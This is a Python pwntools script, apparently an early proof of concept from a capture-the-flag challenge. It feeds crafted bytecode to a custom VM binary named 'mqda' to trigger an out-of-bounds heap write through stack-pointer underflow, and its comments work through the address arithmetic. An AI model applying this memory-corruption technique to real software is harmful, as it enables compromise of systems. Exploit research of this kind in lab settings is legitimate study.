#!/usr/bin/env python3
"""
Actual OOB write via SP underflow!

First PUSH at SP=0: writes at offset 4, SP becomes 0xFFFFFFFC
Second PUSH: SP read as byte = 0xFC, writes at offset 0x100, SP becomes 0xFFFFFFF8
Third PUSH: SP read as byte = 0xF8, writes at offset 0xFC

So the SECOND push writes at offset 0x100-0x103 which is past the 256-byte data area!
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def hlt():
    return bytes([0x00])

def trigger_illegal():
    return bytes([0xFF])

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

# Test: Push to trigger OOB write at offset 0x100
code_addr = 0x10000
stack_page = 0x20000

code = b''
# Set SP to stack_page + 0 (start at offset 0 in page)
code += mov_reg_imm(15, stack_page)
code += mov_reg_imm(0, 0x41414141)  # Value to write

# First PUSH: writes at [SP+4] = [stack_page+4], then SP = stack_page - 4 = 0x1FFFC
code += push_reg(0)

# Now SP = 0x1FFFC. The lower byte is 0xFC.
# Second PUSH: reads SP as byte = 0xFC? NO! Let me check the address calculation

print("[*] Wait - need to understand address calculation")
print("[*] PUSH uses get_page on (SP >> 8), and offset = SP & 0xFF")

# If SP = 0x1FFFC = 0b0001_1111_1111_1111_1100
# SP >> 8 = 0x1FF, offset = 0xFC
# Writes at get_page(0x1FF)[0xFC + 4] = page[0x100]

# page is 4-byte header + 256-byte data = 260 bytes
# malloc(260) gives usable ~264 bytes
# Writing at offset 0x100 (256) is EXACTLY at the end of usable area

print("[*] If stack starts at 0x20000 (offset 0), after first PUSH:")
print("[*]   SP = 0x20000 - 4 = 0x1FFFC")
print("[*]   Page addr = 0x1FFFC >> 8 = 0x1FF")
print("[*]   Offset = 0x1FFFC & 0xFF = 0xFC")
print("[*]   Write offset = 0xFC + 4 = 0x100")
print("[*]   This is at page data byte 0x100, which is BEYOND 256 bytes!")

# Let me verify with an actual test that causes a write
print("\n[*] Testing OOB write at offset 0x100...")

code = b''
code += mov_reg_imm(15, 0x20000)    # SP = 0x20000
code += mov_reg_imm(0, 0xCAFEBABE) 
code += push_reg(0)                  # Writes at 0x20004, SP = 0x1FFFC
code += mov_reg_imm(0, 0xDEADBEEF)
code += push_reg(0)                  # Should write at page[0x100] - OOB!
code += hlt()

print(f"[*] Code length: {len(code)}")
print(f"[*] Code: {code.hex()}")

p = process(['./mqda'])
p.recvuntil(b'Code Address> ')
p.sendline(str(code_addr).encode())
p.recvuntil(b'Code Length> ')
p.sendline(str(len(code)).encode())
p.recvuntil(b'Code> ')
p.send(code)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr).encode())

output = p.recvall(timeout=2)
print(f"[*] Output: {output}")
p.close()
